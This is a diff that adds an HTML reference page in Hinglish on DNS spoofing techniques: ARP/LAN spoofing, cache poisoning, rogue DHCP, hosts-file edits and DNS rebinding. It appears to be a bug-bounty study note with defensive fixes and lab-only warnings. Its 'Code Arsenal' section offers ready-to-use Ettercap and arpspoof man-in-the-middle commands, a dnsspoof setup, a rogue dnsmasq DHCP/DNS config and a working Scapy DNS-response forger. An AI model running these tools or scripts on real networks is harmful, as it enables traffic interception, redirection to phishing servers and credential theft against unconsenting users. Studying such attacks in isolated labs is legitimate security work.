@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DNS Spoofing Advanced Arsenal — Recon Notes</title>
+<style>
+  :root{
+    --bg:#060a12; --panel:#0b1120; --panel2:#0e1830; --border:#1c2942;
+    --green:#39ff9d; --cyan:#4fd8ff; --pink:#ff5ea8; --yellow:#ffd447;
+    --red:#ff5470; --purple:#b98bff; --text:#c9d6f0; --dim:#7186ad;
+  }
+  *{box-sizing:border-box;}
+  body{ margin:0; background: radial-gradient(circle at 10% 0%, rgba(79,216,255,0.08), transparent 40%),
+      radial-gradient(circle at 90% 20%, rgba(185,139,255,0.08), transparent 40%), var(--bg);
+    color:var(--text); font-family:'Consolas','SF Mono',monospace; line-height:1.6; padding:0 0 60px 0; }
+  header{ text-align:center; padding:38px 20px 22px; border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg, rgba(79,216,255,0.06), transparent); }
+  header h1{ margin:0; font-size:2rem; letter-spacing:2px; color:var(--cyan); text-shadow:0 0 18px rgba(79,216,255,0.55); }
+  header .sub{ color:var(--dim); margin-top:10px; font-size:0.95rem; }
+  header .warn{ display:inline-block; margin-top:16px; padding:8px 16px; border:1px solid var(--red);
+    color:var(--red); border-radius:6px; font-size:0.85rem; background:rgba(255,84,112,0.07); }
+  .mindset{ max-width:1100px; margin:24px auto 0; padding:18px 24px; border:1px dashed var(--purple);
+    border-radius:8px; background:rgba(185,139,255,0.06); color:var(--purple); text-align:center; font-size:0.95rem; }
+  nav{ max-width:1100px; margin:26px auto; padding:0 20px; display:flex; flex-wrap:wrap; gap:8px; justify-content:center; }
+  nav a{ color:var(--green); border:1px solid var(--border); padding:6px 12px; border-radius:20px;
+    text-decoration:none; font-size:0.8rem; background:var(--panel); transition:0.2s; }
+  nav a:hover{ border-color:var(--green); box-shadow:0 0 10px rgba(57,255,157,0.35); }
+  main{ max-width:1100px; margin:0 auto; padding:0 20px; display:flex; flex-direction:column; gap:26px; }
+  .card{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:24px 26px; position:relative; overflow:hidden; }
+  .card::before{ content:""; position:absolute; top:0; left:0; right:0; height:3px; background:var(--accent); }
+  .tag{ display:inline-block; font-size:0.7rem; letter-spacing:1px; padding:3px 9px; border-radius:4px;
+    color:#04121a; background:var(--accent); font-weight:bold; margin-bottom:10px; }
+  .card h2{ margin:4px 0 12px; font-size:1.35rem; color:var(--accent); }
+  .card p.desc{ color:var(--text); margin:0 0 14px; }
+  .steps{ background:rgba(0,0,0,0.28); border:1px solid var(--border); border-radius:8px; padding:14px 18px; margin:12px 0; }
+  .steps h3{ margin:0 0 8px; font-size:0.85rem; color:var(--dim); text-transform:uppercase; letter-spacing:1px; }
+  .steps ol{ margin:0; padding-left:20px; } .steps li{ margin-bottom:6px; }
+  .example{ background:#020408; border:1px solid var(--border); border-left:3px solid var(--accent);
+    border-radius:6px; padding:14px 16px; font-size:0.85rem; overflow-x:auto; margin:12px 0; color:#8fffc0; white-space:pre-wrap; }
+  .example .c1{color:var(--cyan);} .example .c2{color:var(--pink);} .example .c3{color:var(--yellow);} .example .ok{color:var(--green);}
+  .impact{ display:flex; gap:10px; align-items:center; margin-top:14px; padding:10px 14px; border-radius:6px;
+    background:rgba(255,84,112,0.08); border:1px solid rgba(255,84,112,0.35); color:var(--red); font-size:0.85rem; }
+  .fix{ margin-top:10px; padding:10px 14px; border-radius:6px; background:rgba(57,255,157,0.06);
+    border:1px solid rgba(57,255,157,0.3); color:var(--green); font-size:0.85rem; }
+  code{ color:var(--yellow); }
+  .codesection{ max-width:1100px; margin:10px auto 0; padding:0 20px; }
+  .codesection-header{ text-align:center; padding:30px 20px 10px; }
+  .codesection-header h1{ margin:0; font-size:1.8rem; color:var(--yellow); text-shadow:0 0 16px rgba(255,212,71,0.5); letter-spacing:2px; }
+  .codesection-header p{ color:var(--dim); margin-top:8px; }
+  .codeblock{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:20px 24px; margin-bottom:20px; }
+  .codeblock h3{ color:var(--yellow); margin:0 0 12px; font-size:1.05rem; border-bottom:1px dashed var(--border); padding-bottom:8px;}
+  .codeblock .example{ margin:10px 0; }
+  .codeblock p.note{ color:var(--dim); font-size:0.8rem; margin:6px 0 0; }
+  footer{ text-align:center; color:var(--dim); font-size:0.8rem; margin-top:40px; padding:0 20px; }
+  footer .box{ max-width:700px; margin:0 auto; border:1px dashed var(--border); border-radius:8px; padding:16px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>&gt; DNS_SPOOFING_ADVANCED.md</h1>
+  <div class="sub">DNS Cache Poisoning / Spoofing — advanced techniques + poora code arsenal</div>
+  <div class="warn">⚠ Sirf apne khud ke lab (isolated network/VM) mein ya explicit written authorization ke saath hi practice karo — DNS spoofing network-level attack hai aur real infrastructure pe illegal hai (IT Act 2000)</div>
+</header>
+
+<div class="mindset">
+  🧠 <strong>Concept simple hai:</strong> Jab bhi tum <code>target.com</code> type karte ho, tumhara device ek DNS server se poochta hai "iska IP kya hai?" DNS spoofing ka matlab hai — is sawaal-jawab (query-response) mein galat/fake IP daal dena, taaki victim asli site ki jagah attacker ke server pe pahunch jaaye — bina URL bar mein kuch bhi ghalat dikhe.
+</div>
+
+<nav>
+  <a href="#t1">01 DNS Resolution Samjho</a>
+  <a href="#t2">02 Local Network ARP+DNS Spoofing</a>
+  <a href="#t3">03 DNS Cache Poisoning (Off-Path)</a>
+  <a href="#t4">04 Rogue DHCP + DNS</a>
+  <a href="#t5">05 Hosts File / Local Poisoning</a>
+  <a href="#t6">06 DNS Rebinding (App-Layer)</a>
+  <a href="#t7">07 DNSSEC Ka Role</a>
+  <a href="#t8">08 Detection Aur PoC</a>
+  <a href="#code">💾 Code Arsenal</a>
+</nav>
+
+<main>
+
+  <!-- 01 -->
+  <div class="card" id="t1" style="--accent:var(--green)">
+    <span class="tag">FOUNDATION</span>
+    <h2>01. DNS Resolution Kaise Kaam Karta Hai (Pehle Yeh Samjho)</h2>
+    <p class="desc">Spoofing samajhne se pehle normal flow samajhna zaroori hai. Jab tum <code>target.com</code> browser mein type karte ho, teen jagah IP-lookup ho sakta hai — har jagah spoofing ka apna alag tareeka hai.</p>
+    <div class="steps">
+      <h3>Normal Flow</h3>
+      <ol>
+        <li>Device pehle apni local <code>hosts</code> file check karta hai (agar entry hai to seedha wahi use hota hai).</li>
+        <li>Fir apna configured DNS resolver (router se mila, ya manually set — jaise 8.8.8.8) se poochta hai.</li>
+        <li>Wo resolver — agar cache mein nahi hai — root servers se shuru karke <code>.com</code> nameservers, fir <code>target.com</code> ke authoritative nameserver tak jaake asli IP nikaalta hai.</li>
+        <li>Jawab wapas aata hai, device us IP pe connect karta hai.</li>
+      </ol>
+    </div>
+    <div class="example">Tum: "target.com ka IP?"
+Local hosts file → kuch nahi mila
+Router/DNS resolver → "wait, pooch ke aata hoon"
+Authoritative nameserver → "93.184.216.34"
+Tumhara browser → us IP pe connect ho gaya</div>
+    <div class="impact">💥 Note: Spoofing ka matlab hai — kisi bhi is step ko bech mein intercept karke galat jawab de dena.</div>
+    <div class="fix">🛡 Reminder: In teeno jagah (hosts file, local network, resolver) ko alag-alag attack kiya ja sakta hai — neeche ek-ek dekhenge.</div>
+  </div>
+
+  <!-- 02 -->
+  <div class="card" id="t2" style="--accent:var(--cyan)">
+    <span class="tag">LAB PRACTICE</span>
+    <h2>02. Local Network (LAN) DNS Spoofing — Same WiFi Wale Victim Pe</h2>
+    <p class="desc">Sabse common practical tareeka — agar attacker aur victim same network (WiFi/LAN) pe hain, to ARP spoofing se pehle "man-in-the-middle" banke, fir DNS queries ko intercept karke fake response bheja ja sakta hai.</p>
+    <div class="steps">
+      <h3>Steps (Sirf Apne Lab/Isolated Network Mein)</h3>
+      <ol>
+        <li>Pehle ARP spoofing se victim aur router ke beech apne aap ko "beech mein" laao (traffic tumse hoke guzre).</li>
+        <li>IP forwarding enable karo apni machine pe (taaki victim ka internet chalta rahe, sirf traffic tumse hoke jaaye).</li>
+        <li>Ek DNS-spoofing tool (Ettercap/dnsspoof) chalao jo specific domain ke liye fake IP reply kare.</li>
+        <li>Victim jab target-domain browse kare, uske DNS query ka jawab tumhari machine deti hai (asli DNS server se pehle) — fake IP (jo tumhara controlled server hai).</li>
+        <li>Victim ka browser tumhare fake server pe pahunch jaata hai — jahan tum phishing-page ya monitoring page daal sakte ho.</li>
+      </ol>
+    </div>
+    <div class="example"># /etc/ettercap/etter.dns mein entry:
+target.com A <span class="c2">192.168.1.50</span>   <span class="c3"># attacker ka IP</span></div>
+    <div class="impact">💥 Impact: Victim ko lagta hai wo asli site pe hai, lekin actually attacker ke server pe hai — credentials theft, malware serve karna possible.</div>
+    <div class="fix">🛡 Fix: HTTPS + HSTS use karo (certificate mismatch se pakda jaata hai), encrypted DNS (DoH/DoT) use karo, network-level ARP-spoofing detection tools rakho.</div>
+  </div>
+
+  <!-- 03 -->
+  <div class="card" id="t3" style="--accent:var(--pink)">
+    <span class="tag">EXPERT</span>
+    <h2>03. DNS Cache Poisoning (Off-Path / Kaminsky-Style)</h2>
+    <p class="desc">Yeh advanced technique hai jahan attacker victim ke same-network pe hue bina bhi, ek DNS resolver ke cache mein galat entry "inject" karne ki koshish karta hai — taaki us resolver ko use karne wale SAARE users galat IP pe bhejein.</p>
+    <div class="steps">
+      <h3>Concept Samjho (Theoretical, Lab-Only)</h3>
+      <ol>
+        <li>Jab ek DNS resolver kisi domain ke liye query bhejta hai (kyunki cache mein nahi hai), wo ek random Transaction ID (16-bit) ke saath jaata hai.</li>
+        <li>Attacker resolver ko forge kiye hue bahut saare fake-response bhejta hai (alag-alag guessed Transaction IDs ke saath), pehle se predict karke ki resolver kab query bhejega.</li>
+        <li>Agar koi ek fake-response ka Transaction ID match ho jaaye asli query se — resolver usko "asli" jawab maan ke apne cache mein save kar leta hai.</li>
+        <li>Ab jab tak cache expire na ho, us resolver ko use karne wala HAR user galat IP pe bhejta rehta hai.</li>
+      </ol>
+    </div>
+    <div class="example"><span class="c3">// Yeh purane/misconfigured DNS resolvers pe kaam karta tha jinme:</span>
+- Transaction ID predictable/sequential thi
+- Source port bhi fixed/predictable thi
+- Modern resolvers dono ko randomize karte hain — isliye attack mushkil ho gaya hai</div>
+    <div class="impact">💥 Impact: Ek hi successful poisoning se poore ISP/organization ke saare users affected ho sakte hain — mass-scale impact.</div>
+    <div class="fix">🛡 Fix: DNSSEC (cryptographic signing) use karo, source-port randomization + transaction-ID randomization already-modern resolvers mein built-in hai.</div>
+  </div>
+
+  <!-- 04 -->
+  <div class="card" id="t4" style="--accent:var(--yellow)">
+    <span class="tag">LAB PRACTICE</span>
+    <h2>04. Rogue DHCP Server + DNS Redirect</h2>
+    <p class="desc">Ek aur LAN-based tareeka — agar tum network pe apna khud ka DHCP server chala do jo tumhare configured DNS server ko "default DNS" bata de, to jo bhi naya device network join karega, uski saari DNS queries automatically tumhare (attacker ke) DNS server se hoke jaayengi.</p>
+    <div class="steps">
+      <h3>Steps (Sirf Apne Lab Mein)</h3>
+      <ol>
+        <li>Apna khud ka malicious DHCP server setup karo jo asli router se "race" karega naye devices ko IP dene ke liye.</li>
+        <li>DHCP config mein DNS-server field mein apni machine ka IP daalo.</li>
+        <li>Apni machine pe ek DNS server (jaise dnsmasq) chalao jo specific domains ke liye fake IP return kare.</li>
+        <li>Naya device jab network join kare aur tumhara rogue DHCP jeet jaaye race mein, uski DNS queries tumhare through jaayengi.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Poora naya-joining-device automatically affected ho jaata hai bina kisi extra interaction ke.</div>
+    <div class="fix">🛡 Fix: DHCP Snooping enable karo managed switches pe, sirf trusted DHCP servers allow karo.</div>
+  </div>
+
+  <!-- 05 -->
+  <div class="card" id="t5" style="--accent:var(--purple)">
+    <span class="tag">FOUNDATION</span>
+    <h2>05. Hosts File / Local Poisoning (Malware Angle)</h2>
+    <p class="desc">Simplest form — agar attacker ko victim ki machine pe pehle se hi (kisi malware/physical access se) thoda control mil chuka hai, to seedha uski local <code>hosts</code> file edit karke DNS lookup poori tarah bypass kiya ja sakta hai.</p>
+    <div class="steps">
+      <h3>Concept</h3>
+      <ol>
+        <li>Windows mein <code>C:\Windows\System32\drivers\etc\hosts</code>, Linux/Mac mein <code>/etc/hosts</code> file hoti hai.</li>
+        <li>Is file mein manually koi bhi domain-to-IP mapping daali ja sakti hai jo DNS query se bhi pehle check hoti hai.</li>
+        <li>Malware/attacker agar file edit kar de, to victim ka device kabhi asli DNS server tak poochega hi nahi — seedha fake IP use karega.</li>
+      </ol>
+    </div>
+    <div class="example"># /etc/hosts file mein entry:
+<span class="c2">192.168.1.50</span>   target.com</div>
+    <div class="impact">💥 Impact: Sabse "silent" tareeka — network traffic bhi capture nahi hota, sab kuch local hi ho jaata hai.</div>
+    <div class="fix">🛡 Fix: File-integrity monitoring, endpoint-protection jo hosts-file changes flag kare.</div>
+  </div>
+
+  <!-- 06 -->
+  <div class="card" id="t6" style="--accent:var(--red)">
+    <span class="tag">WEB APP ANGLE</span>
+    <h2>06. DNS Rebinding — Application-Layer Attack (Bug Bounty Relevant)</h2>
+    <p class="desc">Yeh wahi concept hai jo tumhari SSRF file mein bhi tha — lekin yahan iska DNS-specific angle hai. Attacker apna khud ka domain banata hai jiska DNS record baar-baar badalta hai (bahut kam TTL ke saath) — pehli baar safe IP, dobara internal IP.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Apna domain banao (jaise <code>attacker-rebind.com</code>) jiska DNS TTL bahut kam ho (1 second).</li>
+        <li>Pehli baar resolve hone par ek safe/public IP do — validation pass ho jaaye.</li>
+        <li>Turant DNS record ko internal target IP (127.0.0.1, ya kisi internal service) mein badal do.</li>
+        <li>Jo bhi application URL-validation ke baad actual request bhejte waqt DOBARA DNS resolve karta hai, uski request internal IP pe chali jaayegi.</li>
+        <li>Yeh khaaskar un apps mein kaam karta hai jo "URL safe hai" ek baar check karke fir request bhejte hain (validate-then-use pattern).</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: SSRF filters/validation ko poori tarah bypass kar deta hai.</div>
+    <div class="fix">🛡 Fix: DNS ko ek hi baar resolve karo aur usi IP pe pin karke request bhejo (dobara resolve mat karo — "DNS pinning").</div>
+  </div>
+
+  <!-- 07 -->
+  <div class="card" id="t7" style="--accent:var(--green)">
+    <span class="tag">DEFENSE UNDERSTANDING</span>
+    <h2>07. DNSSEC Kya Hai Aur Kyun Zaroori Hai (Attacker Perspective Se Bhi Samjho)</h2>
+    <p class="desc">DNSSEC ek cryptographic-signing system hai jo DNS responses ko digitally sign karta hai — taaki resolver verify kar sake ki jawab asli authoritative server se aaya hai, na ki kisi spoofer se. Bug-hunting mein yeh check karna useful hai ki target DNSSEC use karta hai ya nahi.</p>
+    <div class="steps">
+      <h3>Kaise Check Karo</h3>
+      <ol>
+        <li>Target domain ke liye DNSSEC status check karo (Code Arsenal mein command hai).</li>
+        <li>Agar DNSSEC disabled hai — matlab spoofing-resistance weak hai (theoretically), yeh recon-note ke liye useful info hai.</li>
+        <li>Agar enabled hai, spoofing/poisoning attacks bahut zyada mushkil ho jaate hain us domain ke liye.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Note: Bug bounty mein DNSSEC missing hona khud koi "bug" nahi hai, lekin recon ke liye useful signal hai.</div>
+    <div class="fix">🛡 Fix (defender ke liye): DNSSEC enable karo apne domain ke liye registrar settings mein.</div>
+  </div>
+
+  <!-- 08 -->
+  <div class="card" id="t8" style="--accent:var(--cyan)">
+    <span class="tag">DETECTION</span>
+    <h2>08. Spoofing Detect Karna Aur Safe PoC Banana</h2>
+    <p class="desc">Bug bounty context mein, tum kisi live production DNS infrastructure ko spoof nahi kar sakte (illegal + scope se bahar) — lekin apne lab mein practice karke concept solid samajh sakte ho, aur agar kabhi authorized DNS-infrastructure-testing scope mile, tab yeh skills kaam aayengi.</p>
+    <div class="steps">
+      <h3>Practice Setup (Apne Lab Mein)</h3>
+      <ol>
+        <li>Do virtual machines banao (VirtualBox/VMware) — ek "attacker", ek "victim" — same isolated virtual-network pe.</li>
+        <li>Victim VM pe koi bhi test-domain browse karne ki koshish karo.</li>
+        <li>Attacker VM se upar wali techniques try karo (Ettercap/dnsspoof).</li>
+        <li>Wireshark se traffic capture karke dekho DNS response kaise forge hui.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Isolated lab practice se concept clear hota hai bina kisi real-world risk ke.</div>
+    <div class="fix">🛡 Reminder: Kabhi bhi apne ghar/office ke real network ya kisi third-party network pe yeh mat try karna — sirf apne khud ke isolated VMs mein.</div>
+  </div>
+
+</main>
+
+<div class="codesection" id="code">
+  <div class="codesection-header">
+    <h1>💾 CODE ARSENAL — DNS SPOOFING</h1>
+    <p>Ready-to-use commands — sirf apne isolated lab mein use karo</p>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔧 Ettercap — DNS Spoofing Setup (Lab-Only)</h3>
+    <div class="example"><span class="c1"># etter.dns file edit karo (location: /etc/ettercap/etter.dns)</span>
+target.com A 192.168.1.50
+*.target.com A 192.168.1.50
+
+<span class="c1"># Ettercap chalao GUI mode mein</span>
+sudo ettercap -G
+
+<span class="c1"># Ya command-line mode mein (ARP-spoof + DNS-spoof plugin)</span>
+sudo ettercap -T -q -i eth0 -M arp:remote /victim-ip// /router-ip// -P dns_spoof</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🐍 dnsspoof (dsniff suite) — Basic Usage</h3>
+    <div class="example"><span class="c1"># hosts file jaisa ek spoof-config banao</span>
+echo "192.168.1.50 target.com" &gt; dnsspoof.hosts
+
+<span class="c1"># chalao (IP forwarding pehle enable karo)</span>
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo dnsspoof -i eth0 -f dnsspoof.hosts</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔀 ARP Spoofing (DNS Spoofing Se Pehle Zaroori Step)</h3>
+    <div class="example"><span class="c1"># arpspoof se victim aur router dono ko target karo</span>
+sudo arpspoof -i eth0 -t &lt;victim-ip&gt; &lt;router-ip&gt;
+sudo arpspoof -i eth0 -t &lt;router-ip&gt; &lt;victim-ip&gt;
+
+<span class="c1"># dono terminal mein alag-alag parallel chalao</span></div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🖥️ dnsmasq — Rogue DHCP + DNS Server Config</h3>
+    <div class="example"><span class="c1"># /etc/dnsmasq.conf</span>
+interface=eth0
+dhcp-range=192.168.1.100,192.168.1.200,12h
+dhcp-option=6,192.168.1.50   <span class="c3"># apna IP as DNS server</span>
+address=/target.com/192.168.1.50
+
+<span class="c1"># chalao</span>
+sudo dnsmasq -C /etc/dnsmasq.conf -d</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🦈 Wireshark — DNS Traffic Capture/Analyze Karna</h3>
+    <div class="example"><span class="c1"># Command-line se DNS traffic capture</span>
+sudo tcpdump -i eth0 udp port 53 -w dns_capture.pcap
+
+<span class="c1"># Wireshark filter (GUI mein use karo)</span>
+dns
+
+<span class="c1"># Sirf responses dekhne ke liye</span>
+dns.flags.response == 1</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔍 DNSSEC Status Check Karna</h3>
+    <div class="example"><span class="c1"># dig se DNSSEC records check karo</span>
+dig target.com DNSKEY
+dig target.com +dnssec
+
+<span class="c1"># Online tool</span>
+https://dnssec-analyzer.verisignlabs.com/target.com</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🌐 Encrypted DNS Check (DoH/DoT — Defense Verify Karna)</h3>
+    <div class="example"><span class="c1"># DNS-over-HTTPS test</span>
+curl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=target.com&type=A'
+
+<span class="c1"># DNS-over-TLS test (kdig tool se)</span>
+kdig -d @1.1.1.1 +tls target.com</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🧪 Python — Simple DNS Response Forger (Scapy, Lab-Only)</h3>
+    <div class="example"><span class="c1">from scapy.all import *
+
+def spoof_dns(pkt):
+    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
+        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                  UDP(dport=pkt[UDP].sport, sport=53) / \
+                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.1.50"))
+        send(spoofed, verbose=0)
+        print(f"Spoofed response sent for {pkt[DNS].qd.qname}")
+
+sniff(filter="udp port 53", prn=spoof_dns, store=0)</span></div>
+    <p class="note">Sirf apne isolated lab-network mein chalao — yeh raw packet-crafting hai, production/shared network pe illegal aur disruptive hai.</p>
+  </div>
+
+</div>
+
+<footer>
+  <div class="box">
+    Ye reference sirf <strong style="color:var(--green)">apne isolated lab</strong> mein practice ke liye hai.<br>
+    Kisi bhi real/production network pe DNS spoofing karna gambhir cybercrime hai (IT Act 2000) — yeh bug bounty scope mein practically kabhi allowed nahi hota.<br><br>
+    Recon Notes ka part — roadmap: Bug Bounty → Red Team → OSCP
+  </div>
+</footer>
+
+</body>
+</html>
